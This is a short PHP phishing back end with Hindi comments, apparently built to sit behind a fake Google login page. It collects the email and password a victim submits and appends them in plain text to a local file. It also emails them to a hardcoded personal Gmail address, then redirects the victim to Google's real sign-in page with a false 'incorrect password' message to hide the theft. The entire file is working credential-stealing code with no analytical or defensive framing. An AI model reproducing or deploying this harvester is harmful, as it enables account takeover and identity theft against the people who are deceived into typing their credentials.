<?php
// POST method से ईमेल और पासवर्ड प्राप्त करें
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // डेटा को टेक्स्ट फ़ाइल में स्टोर करें
    $file = fopen("EmailPassword.txt", "a"); // 'a' mode फाइल को append करता है
    fwrite($file, "Email: " . $email . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "-------------------------\n");
    fclose($file);

    // Email details
    $to = "abhishek8907654@gmail.com"; // Replace with your email address
    $subject = "New Email and Password";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "https://hunternobrac.github.io/googlework/"; // Replace with your domain or email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully!";
    } else {
        echo "Failed to send email.";
    }

    // Redirect to Google's login page with an error message
    header("Location: https://accounts.google.com/signin/v2/challenge/pwd?err=Your%20email%20or%20password%20is%20incorrect");
    exit();
}
?>
